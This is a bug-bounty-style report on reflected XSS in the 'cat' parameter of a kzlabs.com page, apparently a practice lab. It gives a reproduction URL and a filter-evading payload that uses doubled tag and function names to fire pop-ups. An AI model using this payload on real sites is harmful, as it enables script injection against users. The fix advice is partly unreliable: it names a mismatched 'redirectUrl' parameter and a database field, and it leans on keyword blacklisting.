## Title

 Reflected Cross-Site Scripting (XSS) via cat Parameter 

## Vulnerability Type

Reflected XSS

## Summary : 
In https://kzlabs.com/punishment/29.php?cat=  cat paramter is vulnerable to reflected XSS . website reflects the User input from search paramter . which leads attacker to add malecious javascript code within victims browser when user visit malecious url . 

## Vulnerable Endpoint
https://kzlabs.com/punishment/29.php?cat=

## Steps to Reproduce : 

1. Navigate to the following URL : ```https://kzlabs.com/punishment/29.php?cat=Game2%3Cimimgg%20src=x%20onerror=%22alalertert(1)%22%20onclick=%22confirconfirmm(1)%22%20onmouseover=%22propromptmpt(1)%22%3E```
2. Observe that a JavaScript alert box pops up displaying `1` — confirming that the script executed.
   


## Payload Used

```Game2<imimgg%20src=x%20onerror="alalertert(1)"%20onclick="confirconfirmm(1)"%20onmouseover="propromptmpt(1)">```

## Proof of Concept Request
  ```Screemshot 1 : ``` TThe Report Shows Payload add in search bar . Location where payload should be insert. 

<img width="1920" height="1080" alt="Screenshot From 2026-05-25 12-05-47 (Copy)" src="https://github.com/user-attachments/assets/348ebaf6-b014-45c5-9f96-4bae3d3a165f" />

 

 ```Screenshot 2 : ``` The Report Shows Successfully the Payload has worked and Pop up Box get Fired.
 

 <img width="1920" height="1080" alt="Screenshot From 2026-05-25 12-05-51" src="https://github.com/user-attachments/assets/d7ea2eea-3d67-4fab-929c-80f16afebeb3" />




## Impact
 
 An attacker can perform the following actions using this vulnerability:
  - It allows attackers to hijack user session
  - It potentially leads to full account takeover
  - It allows to perform  unauthorized actions within the vulnerable application
  - It allows attacker to exfiltrate sensitive data
  
## Recommendations for fix:

 Validate and sanitize the redirectUrl parameter to ensure that it does not contain any malicious content. This can be done by:

1. Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
2. Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
4. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
